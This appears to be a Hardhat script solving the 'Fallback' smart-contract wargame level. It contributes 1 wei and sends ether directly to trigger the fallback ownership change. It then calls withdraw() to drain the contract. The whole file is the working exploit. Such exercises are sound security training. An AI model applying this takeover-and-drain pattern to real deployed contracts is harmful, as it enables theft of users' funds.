// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");

async function main() {

  const [deployer] = await hre.ethers.getSigners();

  const contract = await hre.ethers.getContractAt("Fallback", "0x73379d8b82fda494ee59555f333df7d44483fd58", deployer);

  await contract.contribute({
    value: hre.ethers.utils.parseUnits("1", "wei")
  })

  await deployer.sendTransaction({
    to: contract.address,
    value: hre.ethers.utils.parseUnits("1", "wei")  
  });

  await contract.withdraw();

  console.log(await contract.owner())
  console.log(await hre.ethers.provider.getBalance(contract.address));
 
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
